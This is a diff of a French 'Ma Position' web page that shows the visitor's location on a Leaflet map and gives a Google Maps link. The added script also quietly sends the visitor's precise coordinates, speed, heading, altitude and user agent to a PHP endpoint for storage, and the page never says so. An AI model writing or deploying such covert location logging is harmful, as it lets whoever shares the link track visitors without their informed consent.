@@ -3,59 +3,95 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Ma position - Test GitHub</title>
+<title>Ma Position - Carte Moderne</title>
+
+<!-- Leaflet CSS -->
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+
 <style>
   html, body { height: 100%; margin: 0; padding: 0; }
   #map { width: 100%; height: 100%; }
-  #info { position: absolute; top: 10px; left: 10px; background: rgba(255,255,255,0.9); padding: 10px; border-radius: 8px; font-size: 14px; }
+  #info { position: absolute; top: 10px; left: 10px; background: rgba(255,255,255,0.9); padding: 10px; border-radius: 8px; font-size: 14px; z-index:1000; }
+  #btn { background:#1e90ff; border:none; color:white; padding:10px 15px; border-radius:8px; cursor:pointer; font-size:14px; }
 </style>
 </head>
 <body>
+
 <div id="map"></div>
-<div id="info">Accepte la localisation pour voir la carte et obtenir ton lien Google Maps</div>
+<div id="info">
+  <button id="btn">Obtenir ma position</button>
+  <div id="link"></div>
+</div>
+
+<!-- Leaflet JS -->
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
 <script>
-function initMap() {
-  const map = new google.maps.Map(document.getElementById("map"), {
-    center: { lat: 0, lng: 0 },
-    zoom: 2,
-  });
+const API_URL = "post_geo.php"; // PHP pour enregistrer les positions
 
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-      (pos) => {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        const userLoc = { lat: lat, lng: lon };
+// Créer la carte
+const map = L.map('map').setView([0,0], 2);
+L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+  attribution: '&copy; OpenStreetMap contributors'
+}).addTo(map);
 
-        map.setCenter(userLoc);
-        map.setZoom(15);
+const btn = document.getElementById('btn');
+const linkDiv = document.getElementById('link');
 
-        const marker = new google.maps.Marker({
-          position: userLoc,
-          map: map,
-          title: "Vous êtes ici"
-        });
-
-        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-        const infoWindow = new google.maps.InfoWindow({
-          content: `<b>Vous êtes ici</b><br><a href="${mapsLink}" target="_blank">Voir sur Google Maps</a>`
-        });
-        infoWindow.open(map, marker);
-
-        // Afficher le lien dans le div
-        document.getElementById("info").innerHTML = `<b>Votre lien Google Maps :</b><br><a href="${mapsLink}" target="_blank">${mapsLink}</a>`;
-      },
-      (err) => { document.getElementById("info").textContent = "Erreur localisation : " + err.message; },
-      { enableHighAccuracy: true }
-    );
-  } else {
-    document.getElementById("info").textContent = "Votre navigateur ne supporte pas la géolocalisation.";
+btn.addEventListener('click', () => {
+  if (!navigator.geolocation) {
+    alert('Géolocalisation non supportée par votre navigateur.');
+    return;
   }
-}
+
+  btn.disabled = true;
+  btn.textContent = "Recherche en cours...";
+
+  navigator.geolocation.getCurrentPosition(async (pos) => {
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
+
+    // Ajouter un marqueur sur la carte
+    const marker = L.marker([lat, lon]).addTo(map);
+    map.setView([lat, lon], 15);
+
+    // Générer le lien Google Maps
+    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+    linkDiv.innerHTML = `<b>Votre lien Google Maps :</b><br><a href="${mapsLink}" target="_blank">${mapsLink}</a>`;
+
+    // Envoyer au PHP pour sauvegarder
+    const payload = {
+      lat, lon,
+      accuracy_m: pos.coords.accuracy,
+      altitude: pos.coords.altitude,
+      heading: pos.coords.heading,
+      speed: pos.coords.speed,
+      timestamp: pos.timestamp,
+      userAgent: navigator.userAgent,
+      origin: window.location.origin,
+      mapsLink
+    };
+
+    try {
+      await fetch(API_URL, {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify(payload)
+      });
+    } catch(e) {
+      console.error("Erreur envoi PHP :", e);
+    }
+
+    btn.disabled = false;
+    btn.textContent = "Obtenir ma position";
+
+  }, (err) => {
+    alert("Erreur géolocalisation : " + err.message);
+    btn.disabled = false;
+    btn.textContent = "Obtenir ma position";
+  }, { enableHighAccuracy: true });
+});
 </script>
 
-<!-- Remplace YOUR_API_KEY par ta clé Google Maps JavaScript API -->
-<script src="https://maps.googleapis.com/maps/api/js?key=YOUR_API_KEY&callback=initMap" async defer></script>
 </body>
 </html>
